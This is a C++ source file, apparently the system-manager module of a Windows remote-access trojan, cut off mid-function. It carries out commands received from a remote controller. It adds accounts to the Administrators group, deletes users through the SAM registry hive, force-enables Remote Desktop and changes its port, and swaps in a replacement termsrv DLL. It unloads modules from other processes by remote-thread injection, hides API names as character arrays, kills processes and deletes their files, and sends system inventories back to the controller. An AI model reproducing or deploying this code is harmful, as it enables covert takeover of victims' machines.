// SystemManager.cpp: implementation of the CSystemManager class.
//
//////////////////////////////////////////////////////////////////////

#include "SystemManager.h"

#include <stdlib.h>

#include <tlhelp32.h>
#include <psapi.h>
#pragma comment(lib,"Psapi.lib")
#include <Wtsapi32.h>
#pragma comment(lib,"Wtsapi32.lib")
#include <LM.h>
#pragma comment(lib,"netapi32")

//#include "Dialupass.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CSystemManager::CSystemManager(CClientSocket *pClient) : CManager(pClient)
{
	SendProcessList();
	hSendMemoryThread= MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)SendCPUAndMemoryThread, (LPVOID)this, 0, NULL);
}

CSystemManager::~CSystemManager()
{
	WaitForSingleObject(hSendMemoryThread, INFINITE);
	CloseHandle(hSendMemoryThread);
}

bool SwitchInputDesktop1()
{
	BOOL	bRet = false;
	DWORD	dwLengthNeeded;
	
	HDESK	hOldDesktop, hNewDesktop;
	char	strCurrentDesktop[256], strInputDesktop[256];
	
	hOldDesktop = GetThreadDesktop(GetCurrentThreadId());
	memset(strCurrentDesktop, 0, sizeof(strCurrentDesktop));
	GetUserObjectInformation(hOldDesktop, UOI_NAME, &strCurrentDesktop, sizeof(strCurrentDesktop), &dwLengthNeeded);
	
	
	hNewDesktop = OpenInputDesktop(0, FALSE, MAXIMUM_ALLOWED);
	memset(strInputDesktop, 0, sizeof(strInputDesktop));
	GetUserObjectInformation(hNewDesktop, UOI_NAME, &strInputDesktop, sizeof(strInputDesktop), &dwLengthNeeded);
	
	if (_tcsicmp(strInputDesktop, strCurrentDesktop) != 0)
	{
		SetThreadDesktop(hNewDesktop);
		bRet = true;
	}
	CloseDesktop(hOldDesktop);
	
	CloseDesktop(hNewDesktop);
	
	
	return bRet;
}

void CSystemManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	SwitchInputDesktop();

	switch (lpBuffer[0])
	{
	case COMMAND_PSLIST:
		SendProcessList();
		break;
	case COMMAND_WSLIST:
		SendWindowsList();
		break;
	case COMMAND_KILLPROCESS:
		KillProcess((LPBYTE)lpBuffer + 1, nSize - 1);
		SendProcessList();
		break;
// 	case COMMAND_DSLIST:   //��ȡ��������
// 		SendDialupassList();
// 		break;
	case COMMAND_SOFTWARELIST:
		SendSoftWareList();
		break;
	case COMMAND_KILLPROCESS_WINDOW:
		KillProcess((LPBYTE)lpBuffer + 1, nSize - 1);
		SendWindowsList();	
		break;
	case COMMAND_WINDOW_TEST:
		TestWindow(lpBuffer+1);   
		break;
	case COMMAND_WINDOW_CLOSE:  //�򴰿ڷ��͹ر���Ϣ
		CloseWindow(lpBuffer+1);  
		break;
	case COMMAND_SSLIST:
		SendSysInfoList();
		break;
	case COMMAND_USLIST:
		SendSysUserList();
		break;
	case COMMAND_ASLIST:
		SendUserStateList();
		break;
	case COMMAND_ACITVEUSER:
		ChangeUserState((LPBYTE)lpBuffer + 1, nSize - 1, NULL);  
		break;
	case COMMAND_DISABLEEUSER:
		ChangeUserState((LPBYTE)lpBuffer + 1, nSize - 1, TRUE);  
		break;
	case COMMAND_CHANGE_USERPASS:
		ChangeUserPass((LPBYTE)lpBuffer + 1, nSize - 1);
		break;
	case COMMAND_DELUSER:
		DeleteUser((LPBYTE)lpBuffer + 1, nSize - 1);
		break;
	case COMMAND_DISCONNECTUSER:
		DisconnectUser((LPBYTE)lpBuffer + 1, nSize - 1);
		break;
	case COMMAND_LOGOFF_USER:
		LogOffUser((LPBYTE)lpBuffer + 1, nSize - 1);
		break;
	case COMMAND_NET_USER: // ��NET���û�
		NoNetAddUser((LPBYTE)lpBuffer + 1, nSize - 1);
		break;
	case COMMAND_3389_PORT:
		Change3389Port(lpBuffer + 1);
		break;
	case COMMAND_OPEN_3389:
		Open3389();
		break;
	case COMMAND_SEND_TERMSRV:
		if(WriteTermsrv(lpBuffer + 1,nSize -1))
		{
			BYTE bToken = TOKEN_TERMSRV_OK;
			Send(&bToken,sizeof(bToken));
		}
		break;
	case COMMAND_S_SESSION:
		ShutdownWindows(lpBuffer[1]);
		break;
	default:
		break;
	}
}

BOOL bIsOsXP()
{
	OSVERSIONINFOEX OsVerInfoEx;
	OsVerInfoEx.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
	GetVersionEx((OSVERSIONINFO *)&OsVerInfoEx); // ע��ת������
	return OsVerInfoEx.dwMajorVersion == 5 && OsVerInfoEx.dwMinorVersion == 1;
}

void CSystemManager::GetTermsrvFile()
{
	BYTE bToken = TOKEN_GET_TERMSRV;
	Send(&bToken,sizeof(bToken));
}

BOOL CSystemManager::WriteTermsrv(LPBYTE lpBuffer, UINT nSize)
{
	TCHAR		lpDllName[MAX_PATH];
	GetSystemDirectory(lpDllName, MAX_PATH);
	_tcscat(lpDllName, "\\termsrv_t.dll");
	
	HANDLE hFile; 
	DWORD  dwBytesWritten;
	hFile = CreateFile(lpDllName,GENERIC_WRITE,FILE_SHARE_READ,NULL,CREATE_ALWAYS,NULL,NULL);
	if (hFile == INVALID_HANDLE_VALUE)
		return false;
    if(!WriteFile(hFile, lpBuffer, nSize, &dwBytesWritten, NULL)) 
		return false;
	CloseHandle(hFile); 

	Open3389();
	
	return true;
}


bool UnloadRemoteModule(DWORD dwProcessID, HANDLE hModuleHandle)
{
	HANDLE hRemoteThread;
	HANDLE hProcess;
	
	if (hModuleHandle == NULL)
		return false;
	hProcess=OpenProcess(PROCESS_VM_WRITE|PROCESS_CREATE_THREAD|PROCESS_VM_OPERATION, FALSE, dwProcessID);
	if (hProcess == NULL)
		return false;
	
	char ExUmf[] = {'k','e','r','n','e','l','3','2','.','d','l','l','\0'};
	
	char TjHbd[] = {'F','r','e','e','L','i','b','r','a','r','y','\0'};
	
	HMODULE hModule=GetModuleHandle(ExUmf);
	LPTHREAD_START_ROUTINE pfnStartRoutine = (LPTHREAD_START_ROUTINE)::GetProcAddress(hModule, TjHbd);
	hRemoteThread=CreateRemoteThread(hProcess, NULL, 0, pfnStartRoutine, hModuleHandle, 0, NULL);
	
	if(hRemoteThread==NULL)
	{
		CloseHandle(hProcess);
		return false;
	}
	WaitForSingleObject(hRemoteThread,INFINITE);
	CloseHandle(hProcess);
	CloseHandle(hRemoteThread);
	return true;
}

HANDLE FindModule(DWORD dwProcessID, LPCTSTR lpModulePath)
{
	HANDLE hModuleHandle = NULL;
	MODULEENTRY32 me32 = {0};
	HANDLE hModuleSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, dwProcessID);
	me32.dwSize = sizeof(MODULEENTRY32);
	if(::Module32First(hModuleSnap, &me32))
	{
		do
		{	
			if (_tcsicmp(me32.szExePath, lpModulePath) == 0)
			{
				hModuleHandle = me32.hModule;
				break;
			}
		}while(::Module32Next(hModuleSnap,&me32));
	}
	::CloseHandle(hModuleSnap);
	return hModuleHandle;
}


bool UnloadModule(LPCTSTR lpModulePath)
{
	BOOL bRet = false;
	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(pe32);
	
	HANDLE hProcessSnap=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
	
	//������صĽ���
	if(Process32First(hProcessSnap, &pe32))
	{
		do
		{
			HANDLE hModuleHandle = FindModule(pe32.th32ProcessID, lpModulePath);
			if (hModuleHandle != NULL)
			{
				bRet = UnloadRemoteModule(pe32.th32ProcessID, hModuleHandle);
			}
		}while (Process32Next(hProcessSnap,&pe32));
	}
	CloseHandle(hProcessSnap);
	return bRet;
}

bool CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam)
{
	if (!IsWindowVisible(hwnd))
		return true;
	
	DWORD dwWindowThreadId = NULL;
	DWORD dwLsassId = (DWORD)lParam;
	GetWindowThreadProcessId(hwnd, &dwWindowThreadId);
	if (dwWindowThreadId == (DWORD)lParam)
	{
		// �ر�ָ�����̵Ĵ���
		SendMessage(hwnd, WM_CLOSE, 0, 0);
	}
	return true;
}
DWORD GetProcessId(LPCTSTR szProcName)
{
	PROCESSENTRY32 pe; 
	DWORD dwPid;
	DWORD dwRet;
	BOOL bFound = FALSE;
	
	HANDLE hSP = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSP)
	{
		pe.dwSize = sizeof( pe );
		
		for (dwRet = Process32First(hSP, &pe); dwRet; dwRet = Process32Next(hSP, &pe))
		{
			if (_tcsicmp( szProcName, pe.szExeFile) == 0)
			{
				dwPid = pe.th32ProcessID;
				bFound = TRUE;
				break;
			}
		}
		CloseHandle(hSP);
		
		if (bFound == TRUE)
		{
			return dwPid;
		}
	}
	return NULL;
}

void HijackService()
{
	TCHAR strDll[MAX_PATH];
	GetSystemDirectory(strDll, sizeof(strDll));
	_tcscat(strDll, "\\termsrv.dll");
	
	// ��������ж�����ڼ��ص�DLL
	CSystemManager::DebugPrivilege(SE_DEBUG_NAME, TRUE);
	if (!UnloadModule(strDll))
		return;
	CSystemManager::DebugPrivilege(SE_DEBUG_NAME, FALSE);
	
	// �ر�Ҫ�����ĳ���Ի������DLLǿ��ж��ʹһЩ�����쳣��ֹ�����������Զ��ػ��Ի���
	// �Խ��̸���ر�Ȩ��
	CSystemManager::DebugPrivilege(SE_SHUTDOWN_NAME,TRUE);
	DWORD dwLsassId = GetProcessId("csrss.exe");
	while (!AbortSystemShutdown(NULL))
	{
		// һЩϵͳ�ǻᵯ��drwtsn32.exe
		DWORD dwDrwtsn32Id = GetProcessId("drwtsn32.exe");
		if (dwDrwtsn32Id != NULL)
		{
			EnumWindows((WNDENUMPROC)EnumWindowsProc, (LPARAM)dwDrwtsn32Id);
		}
		// ģ��ǿ��ж��ʱ�������ر�csrss.exe���̵����ĳ������
		EnumWindows((WNDENUMPROC)EnumWindowsProc, (LPARAM)dwLsassId);
		Sleep(10);
	}
	CSystemManager::DebugPrivilege(SE_SHUTDOWN_NAME, FALSE);
}

void OnStartService(LPCTSTR lpService)
{
	SC_HANDLE hSCManager = OpenSCManager( NULL, NULL,SC_MANAGER_CREATE_SERVICE );
	if ( NULL != hSCManager )
	{
		SC_HANDLE hService = OpenService(hSCManager, lpService, DELETE | SERVICE_START);
		if ( NULL != hService )
		{
			StartService(hService, 0, NULL);
			CloseServiceHandle( hService );
		}
		CloseServiceHandle( hSCManager );
	}
}

void CSystemManager::Open3389()
{
	if (bIsOsXP())
	{
		TCHAR szDllPath[MAX_PATH];
		GetSystemDirectory(szDllPath, sizeof(szDllPath));
		_tcscat(szDllPath, "\\termsrv_t.dll");
		
		if (GetFileAttributes(szDllPath) != -1)
		{
			HMODULE hLoad = LoadLibrary(szDllPath);
			if (hLoad)
				FreeLibrary(hLoad);
			else
			{
				GetTermsrvFile();
				return;
			}
		}
		else
		{
			GetTermsrvFile();
			return; 
		}
	}
	
	WriteRegEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", "ShutdownWithoutLogon", REG_DWORD, NULL, 0, 0);
	WriteRegEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows\\Installer", "EnableAdminTSRemote", REG_DWORD, NULL, 1, 0);
	WriteRegEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", "KeepRASConnections", REG_SZ, "1", 0, 0);
	WriteRegEx(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\TermDD", "Start", REG_DWORD, NULL, 2, 0);
	WriteRegEx(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\TermService", "iKNVW", REG_DWORD, NULL, 2, 0);
	WriteRegEx(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Terminal Server", "TSEnabled", REG_DWORD, NULL, 1, 0);
	WriteRegEx(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Licensing Core", "EnableConcurrentSessions", REG_DWORD, NULL, 1, 0);
	
	if (bIsOsXP())
	{
		
		WriteRegEx(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\TermService\\Parameters", "ServiceDll", REG_EXPAND_SZ,
			"%SystemRoot%\\system32\\termsrv_t.dll", 0, 0);
		HijackService();
	}
	OnStartService("TermService");
	Sleep(500);
	WriteRegEx(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Terminal Server", "fDenyTSConnections", REG_DWORD, NULL, 0, 0);
}

BOOL CSystemManager::Change3389Port(LPVOID lparam)
{
	DWORD szPort=atoi((char*)lparam);
	if (szPort>65535 || szPort <= 0)
		return FALSE;
	
	WriteRegEx(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\RDPTcp", "PortNumber", REG_DWORD, NULL, szPort, 0);
	WriteRegEx(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp", "PortNumber", REG_DWORD, NULL, szPort, 0);
	WriteRegEx(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Wds\\rdpwd\\Tds\tcp", "PortNumber", REG_DWORD, NULL, szPort, 0);
	
	return TRUE;
}

wchar_t* AnsiToUnicode(char* str)
{
	if( !str )
		return NULL;
	
	int wcslen = ::MultiByteToWideChar(CP_ACP, NULL, str, _tcslen(str), NULL, 0);
	wchar_t *wstr = new wchar_t[wcslen + 1];
	::MultiByteToWideChar(CP_ACP, NULL, str, _tcslen(str), wstr, wcslen);
	wstr[wcslen] = '\0';
	
	return wstr;
}

void CSystemManager::DisconnectUser(LPBYTE lpBuffer, UINT nSize)
{
	CSystemManager::DebugPrivilege(SE_DEBUG_NAME, TRUE);
	
	for (int i = 0; i < nSize; i += 4)
	{
		WTSDisconnectSession(WTS_CURRENT_SERVER_HANDLE, *(LPDWORD)(lpBuffer + i) , FALSE );
	}
	CSystemManager::DebugPrivilege(SE_DEBUG_NAME, FALSE);
	
	SendUserStateList();
}

void CSystemManager::LogOffUser(LPBYTE lpBuffer, UINT nSize)
{
	CSystemManager::DebugPrivilege(SE_DEBUG_NAME, TRUE);
	
	for (int i = 0; i < nSize; i += 4)
	{
		WTSLogoffSession(WTS_CURRENT_SERVER_HANDLE, *(LPDWORD)(lpBuffer + i) , FALSE );
	}
	CSystemManager::DebugPrivilege(SE_DEBUG_NAME, FALSE);
	
	SendUserStateList();
}

void CSystemManager::NoNetAddUser(LPBYTE lpBuffer, UINT nSize)
{
	USER_INFO_1 ui;
	DWORD dwError = 0;
	NET_API_STATUS nStatus;
	
	TCHAR *lpUser = (TCHAR *)lpBuffer;
	TCHAR *lpPass = (TCHAR *)lpBuffer + ( (_tcslen(lpUser) + 1) * sizeof(TCHAR));
	TCHAR *lpGroup = (TCHAR *)lpBuffer + ( (_tcslen(lpPass) + 1) * sizeof(TCHAR) + (_tcslen(lpUser) + 1) * sizeof(TCHAR));
	
	ui.usri1_name = AnsiToUnicode(lpUser);    //�����Ҫ��ӵ��û����������Լ��ĸ�
	ui.usri1_password = AnsiToUnicode(lpPass);   //������û����룬Ҳ�����Լ��ĸ�
	ui.usri1_priv = USER_PRIV_USER; 
	ui.usri1_home_dir = NULL; 
	ui.usri1_comment = NULL; 
	ui.usri1_flags = UF_SCRIPT; 
	ui.usri1_script_path = NULL; 
	nStatus = NetUserAdd(NULL, 1, (LPBYTE)&ui, &dwError);
	
	if (nStatus != NERR_Success)
	{
		return;
	}
	wchar_t szAccountName[100]={0};  
	wcscpy(szAccountName,ui.usri1_name);  
	LOCALGROUP_MEMBERS_INFO_3 account;
	account.lgrmi3_domainandname=szAccountName;  
	
	//��ӵ�Administrators��
	nStatus = NetLocalGroupAddMembers(NULL,AnsiToUnicode(lpGroup),3,(LPBYTE)&account,1);
	if (nStatus == NERR_Success)
	{
		SendSysUserList();
	}
	return;
}

void CSystemManager::DeleteUser(LPBYTE lpBuffer, UINT nSize)
{
	TCHAR *lpUserName =  (TCHAR*)lpBuffer;
	BYTE bToken = NULL;
	NET_API_STATUS nStatus;	
	nStatus = NetUserDel(NULL,AnsiToUnicode(lpUserName));
	if(nStatus==NERR_Success)
	{
		goto DELSUCCESS;
	}
	if(nStatus!=NERR_Success&&nStatus!=NERR_UserNotFound)
	{
		char strType[32]={0};
		TCHAR lpSubKey[128];
		wsprintf(lpSubKey,"SAM\\SAM\\Domains\\Account\\Users\\Names\\%s",lpUserName);
		
		if(!ReadRegEx(HKEY_LOCAL_MACHINE,lpSubKey,"",REG_BINARY,strType,NULL, sizeof(DWORD),0))
			return;
		
		if(WriteRegEx(HKEY_LOCAL_MACHINE, "SAM\\SAM\\Domains\\Account\\Users\\Names\\", lpUserName, NULL, NULL, NULL, 2))
		{
			
			if(!WriteRegEx(HKEY_LOCAL_MACHINE, "SAM\\SAM\\Domains\\Account\\Users\\", strType, REG_SZ, NULL, NULL, 2))
				return;
			else
				goto DELSUCCESS;
		}
		else
			return;
	}
	
DELSUCCESS:
	SendSysUserList();
}

void CSystemManager::ChangeUserPass(LPBYTE lpBuffer, UINT nSize)
{
	BYTE bToken = NULL;
	TCHAR *lpUser =  (TCHAR*)lpBuffer;
	TCHAR *lpPass =  (TCHAR*)lpBuffer + ((_tcslen(lpUser) + 1) * sizeof(TCHAR));
	
	USER_INFO_3 *pUI=NULL;
	DWORD dwError = 0;
	NET_API_STATUS nStatus;	
	
	nStatus=NetUserGetInfo(NULL,AnsiToUnicode(lpUser),3,(LPBYTE*)&pUI);
	
	pUI->usri3_flags = UF_NORMAL_ACCOUNT|UF_DONT_EXPIRE_PASSWD;
	pUI->usri3_password=AnsiToUnicode(lpPass);
	pUI->usri3_password_expired=FALSE;
	nStatus=NetUserSetInfo(NULL,AnsiToUnicode(lpUser),3,(LPBYTE)pUI,&dwError);
	
	if(nStatus==NERR_Success)
	{
		bToken = TOKEN_CHANGE_PSAA_SUCCESS;
		Send(&bToken, 1);
		LocalFree((LPBYTE)&bToken);
	}
	if (pUI != NULL)
		NetApiBufferFree(pUI);
}


void CSystemManager::ChangeUserState(LPBYTE lpBuffer, UINT nSize , UINT User_kt)  //�ʻ�����/ͣ��
{
	wchar_t user_name[256]={0};
	USER_INFO_1008 ui;
	DWORD dwLevel = 1008;
	NET_API_STATUS nStatus;
	mbstowcs(user_name, (const char *)lpBuffer,256);
	if(User_kt==NULL)  //�û�����
		ui.usri1008_flags = UF_SCRIPT|UF_DONT_EXPIRE_PASSWD;  // �û�ͣ�� | �����ò�����
	else  //�û�ͣ��
		ui.usri1008_flags = UF_ACCOUNTDISABLE|UF_PASSWD_CANT_CHANGE;  // �û�ͣ�� | �û����ܸ�������
	
	nStatus = NetUserSetInfo( NULL,user_name,dwLevel, (LPBYTE )&ui,NULL);
	if (nStatus == NERR_Success)
		SendSysUserList();
}

__int64 CompareFileTime ( FILETIME time1, FILETIME time2 )   
{   
	__int64 a = time1.dwHighDateTime << 32 | time1.dwLowDateTime ;   
	__int64 b = time2.dwHighDateTime << 32 | time2.dwLowDateTime ;   
	
	return   (b - a);   
}   
 
int GetCPUOcupPerc()   
{   
	HMODULE hModule_Kernel32 = LoadLibrary(_T("kernel32.dll"));
	typedef BOOL (WINAPI *TGetSystemTimes)(LPFILETIME,LPFILETIME,LPFILETIME); 
	TGetSystemTimes MyGetSystemTimes = (TGetSystemTimes) GetProcAddress(hModule_Kernel32, "GetSystemTimes");

    HANDLE hEvent;   
    BOOL res ;   
	
    FILETIME preidleTime;   
    FILETIME prekernelTime;   
    FILETIME preuserTime;   
	
    FILETIME idleTime;   
    FILETIME kernelTime;   
    FILETIME userTime;   
	
    res = MyGetSystemTimes( &idleTime, &kernelTime, &userTime );   
	
    preidleTime = idleTime;   
    prekernelTime = kernelTime;   
    preuserTime = userTime ;   
	
    Sleep(1000);
    res = MyGetSystemTimes( &idleTime, &kernelTime, &userTime );   
	
    int idle = CompareFileTime( preidleTime,idleTime);   
    int kernel = CompareFileTime( prekernelTime, kernelTime);   
    int user = CompareFileTime(preuserTime, userTime);   
	
    int cpu = (kernel +user - idle) *100/(kernel+user);   

	if (hModule_Kernel32)
		FreeLibrary(hModule_Kernel32);

    return cpu;   
}   

int GetMemOcpuPerc()   
{   
	MEMORYSTATUSEX statex;   
	
	statex.dwLength = sizeof (statex);   
	
	GlobalMemoryStatusEx (&statex);   
	
	return (int)statex.dwMemoryLoad;   
}  

DWORD WINAPI CSystemManager::SendCPUAndMemoryThread(LPVOID lparam)
{
	CSystemManager *pThis = (CSystemManager *)lparam;
	

	BYTE buf[20];
	while (pThis->m_pClient->IsRunning())
	{          
		Sleep(1000 * 3);

		ZeroMemory(buf,20);
		buf[0] = TOKEN_CPUMEMORY;
		
		int Mem = GetMemOcpuPerc();
		int cpu = GetCPUOcupPerc();
		memcpy(buf+1,(void*)&Mem,sizeof(DWORD));   //�ڴ�
		memcpy(buf+1+sizeof(DWORD),(void*)&cpu,sizeof(DWORD));
		
     	pThis->Send((unsigned char *)buf,sizeof(buf));
	}
	
	return true;
}

void CSystemManager::SendSoftWareList()
{
	LPBYTE	lpBuffer = getSoftWareList();
	if (lpBuffer == NULL)
		return;
	
	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}

LPBYTE CSystemManager::getSoftWareList()
{
	const int  MAX_LEG = 256 * sizeof(TCHAR);

	LPBYTE 	lpBuffer = NULL;
	DWORD	dwOffset = 1;
	DWORD   dwLength = 0;
	TCHAR regBufferValue[MAX_LEG] = {0};
	TCHAR regDisplayName[MAX_LEG] = {0};
	TCHAR regPublisher[MAX_LEG] = {0};
	TCHAR regDisplayVersion[MAX_LEG] = {0};
	TCHAR regInstallDate[MAX_LEG] = {0};
	TCHAR regUninstallString[MAX_LEG] = {0};

	lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1024);
	if(lpBuffer == NULL)
		return NULL;

	lpBuffer[0] = TOKEN_SOFTWARE;

	int n  = 0;
	HKEY hKey;
	DWORD dwRegNum = MAX_LEG;
	TCHAR regBufferName[MAX_LEG] = {0};
	if( RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall",
		NULL, KEY_READ, &hKey) == ERROR_SUCCESS    ) 
	{
		if( RegQueryInfoKey(hKey, NULL, NULL, NULL, &dwRegNum, NULL, NULL, NULL, NULL, NULL, NULL, NULL)    ==    ERROR_SUCCESS )
		{

			for( int i = 0; i < (int)dwRegNum; i++ ) 
			{    
				DWORD dwRegSize = MAX_LEG;
				RegEnumKeyEx(hKey, i, regBufferName, &dwRegSize, NULL, NULL, NULL, NULL);
				DWORD dwType; 
				HKEY hSubKey;
				if(  RegOpenKeyEx(hKey, regBufferName, NULL, KEY_READ, &hSubKey) == ERROR_SUCCESS)
				{
					
					dwRegSize = MAX_LEG;
					memset(regDisplayName,0,MAX_LEG);
					RegQueryValueEx(hSubKey, "DisplayName", 0, &dwType, (LPBYTE)regDisplayName, &dwRegSize);


					dwRegSize = MAX_LEG;
					memset(regBufferValue,0,MAX_LEG);
					// ȡParentKeyName��ֵ,�ж��Ƿ��ǲ�����Ϣ, �ǲ�����Ϣ��ֵΪ"OperatingSystem"
					RegQueryValueEx(hSubKey, "ParentKeyName", 0, &dwType, (LPBYTE)regBufferValue, &dwRegSize);
					if( _tcslen(regDisplayName) == 0 || _tcscmp( regBufferValue,"OperatingSystem") == 0 ) //�ж��Ƿ��ǲ�����Ϣ 
					{
						continue;
					}

					
					dwRegSize = MAX_LEG;
					memset(regPublisher,0,MAX_LEG);
					RegQueryValueEx(hSubKey, "Publisher", 0, &dwType,(LPBYTE)regPublisher, &dwRegSize);

					
					dwRegSize = MAX_LEG;
					memset(regDisplayVersion,0,MAX_LEG);
					RegQueryValueEx(hSubKey, "DisplayVersion", 0, &dwType, (LPBYTE)regDisplayVersion, &dwRegSize);

					
					dwRegSize = MAX_LEG;
					memset(regInstallDate,0,MAX_LEG);
					// �ж��Ƿ�����ע����л�ȡ����װʱ��, ��ȡ�����ʱ��
					if(RegQueryValueEx(hSubKey, "InstallDate", 0, &dwType, (LPBYTE)regInstallDate, &dwRegSize) == ERROR_SUCCESS )
					{
					}
					else
					{
						FILETIME fileLastTime;
						RegQueryInfoKey(hSubKey, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 
							NULL, NULL, NULL, &fileLastTime);
						SYSTEMTIME sTime, stLocal ;
						FileTimeToSystemTime(&fileLastTime,&sTime);
						SystemTimeToTzSpecificLocalTime(NULL, &sTime, &stLocal);
						TCHAR tchTime[MAX_LEG] = {0};
						wsprintf(tchTime,"%d%02d%02d",stLocal.wYear,stLocal.wMonth,stLocal.wDay);
						_tcscpy(regInstallDate,tchTime);
					}

					dwRegSize = MAX_LEG;
					memset(regUninstallString,0,MAX_LEG);
					RegQueryValueEx(hSubKey, "UninstallString", 0, &dwType, (LPBYTE)regUninstallString, &dwRegSize);
	

					// ������̫С�������·�����
					dwLength = _tcslen(regDisplayName) + _tcslen(regPublisher) + _tcslen(regDisplayVersion) + _tcslen(regInstallDate) + _tcslen(regUninstallString) + 6;
					if (LocalSize(lpBuffer) < (dwOffset + dwLength))
						lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, (dwOffset + dwLength), LMEM_ZEROINIT|LMEM_MOVEABLE);


					memcpy(lpBuffer + dwOffset, regDisplayName, _tcslen(regDisplayName) + 1);
			    	dwOffset += _tcslen(regDisplayName) + 1;

					memcpy(lpBuffer + dwOffset, regPublisher, _tcslen(regPublisher) + 1);
			    	dwOffset += _tcslen(regPublisher) + 1;

					memcpy(lpBuffer + dwOffset, regDisplayVersion, _tcslen(regDisplayVersion) + 1);
			    	dwOffset += _tcslen(regDisplayVersion) + 1;

					memcpy(lpBuffer + dwOffset, regInstallDate, _tcslen(regInstallDate) + 1);
			    	dwOffset += _tcslen(regInstallDate) + 1;

					memcpy(lpBuffer + dwOffset, regUninstallString, _tcslen(regUninstallString) + 1);
			    	dwOffset += _tcslen(regUninstallString) + 1;										
				}             
			}
		}
	}
	else 
	{
		return FALSE; //�򿪼�ʧ��
	}

	RegCloseKey(hKey);

	lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset, LMEM_ZEROINIT|LMEM_MOVEABLE);

	return lpBuffer;
}

// void CSystemManager::SendDialupassList()
// {
// 	CDialupass	pass;
// 	
// 	int	nPacketLen = 0;
// 	int i;
// 	for (i = 0; i < pass.GetMax(); i++)
// 	{
// 		COneInfo	*pOneInfo = pass.GetOneInfo(i);
// 		for (int j = 0; j < STR_MAX; j++)
// 			nPacketLen += _tcslen(pOneInfo->Get(j)) + 1;
// 	}
// 	
// 	nPacketLen += 1;
// 	LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, nPacketLen);
// 	
// 	DWORD	dwOffset = 1;
// 	for (i = 0; i < pass.GetMax(); i++)
// 	{
// 		COneInfo	*pOneInfo = pass.GetOneInfo(i);
// 		for (int j = 0; j < STR_MAX; j++)
// 		{
// 			int	nFieldLength = _tcslen(pOneInfo->Get(j)) + 1;
// 			memcpy(lpBuffer + dwOffset, pOneInfo->Get(j), nFieldLength);
// 			dwOffset += nFieldLength;
// 		}
// 	}
// 	
// 	lpBuffer[0] = TOKEN_DIALUPASS;
// 	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));
// 	LocalFree(lpBuffer);
// }

void CSystemManager::TestWindow(LPBYTE lpBuffer)
{
   	DWORD hwnd;
	DWORD dHow;
	memcpy((void*)&hwnd,lpBuffer,sizeof(DWORD));      //�õ����ھ��
	memcpy(&dHow,lpBuffer+sizeof(DWORD),sizeof(DWORD));     //�õ����ڴ������
	ShowWindow((HWND__ *)hwnd,dHow);
}

void CSystemManager::CloseWindow(LPBYTE lpBuffer)
{
	DWORD hwnd;
	memcpy(&hwnd,lpBuffer,sizeof(DWORD));      //�õ����ھ�� 
	::PostMessage((HWND__ *)hwnd,WM_CLOSE,0,0); //�򴰿ڷ��͹ر���Ϣ
	
	Sleep(200);
	SendWindowsList();  //������ʾˢ��
}

void CSystemManager::KillProcess(LPBYTE lpBuffer, UINT nSize)
{
	HANDLE hProcess = NULL;
	DebugPrivilege(SE_DEBUG_NAME, TRUE);
	nSize -=1;
	char    strProcessName[MAX_PATH] = {0};
	
	for (UINT i = 0; i < nSize; i += 4)
	{
		hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, *(LPDWORD)(lpBuffer + 1 + i));
		GetModuleFileNameEx(hProcess,NULL,strProcessName, sizeof(strProcessName));
		BOOL bProcess = TerminateProcess(hProcess, 0);

		if (lpBuffer[0] && bProcess)
		{			
			int n = 0;
			while(1)
			{
				DeleteFile(strProcessName);
				Sleep(200);
				if(GetFileAttributes(strProcessName) == -1)  //����ļ�������  �˳�
					break;
				n ++ ;
				if(n >= 10)  //�޷�ɾ�� һ��ʱ����˳�
					break;
			}
		}
		CloseHandle(hProcess);
	}
	DebugPrivilege(SE_DEBUG_NAME, FALSE);
	// ����Sleep�£���ֹ����
	Sleep(100);
}

void CSystemManager::ShutdownWindows( DWORD dwReason )
{
	DebugPrivilege(SE_SHUTDOWN_NAME,TRUE);
	ExitWindowsEx(dwReason, 0);
	DebugPrivilege(SE_SHUTDOWN_NAME,FALSE);	
}

BOOL CSystemManager::DebugPrivilege(LPCTSTR PName,BOOL bEnable)
{
	BOOL              bResult = TRUE;
	HANDLE            hToken;
	TOKEN_PRIVILEGES  TokenPrivileges;
	
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken))
	{
		bResult = FALSE;
		return bResult;
	}
	TokenPrivileges.PrivilegeCount = 1;
